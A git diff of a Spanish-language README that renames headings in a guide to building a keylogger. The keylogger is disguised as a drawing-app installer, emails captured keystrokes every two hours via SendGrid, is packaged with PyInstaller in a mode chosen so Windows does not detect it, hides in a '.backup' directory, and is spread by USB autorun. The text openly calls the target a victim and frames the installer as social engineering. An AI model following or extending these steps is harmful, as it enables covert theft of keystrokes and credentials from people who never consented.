@@ -9,7 +9,7 @@ Crear un instalador que instala una "app" ficticia de dibujo pero a la vez el in
 El keylogger guarda todos los registros de teclado en un fichero y cada 2 horas envía por e-mail todo lo registrado. Se utiliza la librería [Sendgrid](https://sendgrid.com/solutions/email-api/) (Requiere una cuenta)
 
 Para salir del keylogger la víctima puede teclear una combinación de teclas `<ctrl>+<alt>+q`
-## Ejemplo: Crear el ejecutable
+## EXE
 
 Se utiliza [pyinstaller](https://www.pyinstaller.org/) que permite embeber un proyecto pyhton en un .exe
 
@@ -26,7 +26,7 @@ nombre del exe `ej: draw.exe`
 el ejecutable se puede crear de dos modos, en modo `onefile` que solo crea un exe o en modo carpeta `onedir` con el .exe y las librerías. Lo más limpio sería empaquetar el script en un solo fichero .exe. Pero en las pruebas realizadas Windows detecta más facilemente que es un virus cuando se utiliza `onefile`. En modo carpeta windows es más permisible. *De esta manera nos saltamos que windows bloque el keylogger*
 
 El pyinstaller crea el directorio `dist\draw` con el exe `dist\draw\draw.exe` y las librerias
-## Ejemplo: Instalador del keylogger (ingeniería social)
+## Instalador del keylogger (ingeniería social)
 
 Utilizando el software [nsis](https://nsis.sourceforge.io/Main_Page) se enmascara la instalación del keylogger como si fuera un software de dibujo, el usuario creerá que es un app de dibujo (es un enlace a app online) pero también instalará el keylogger en un directorio oculto (`.backup`)
 
@@ -102,7 +102,7 @@ ExecShell "open" "C:\Draw"
 SectionEnd
 
 ```
-# Ejemplo: Crear USB con autplay
+# Crear USB con autplay
 
 ```
 copy autorun.inf.sample d:\autorun.inf
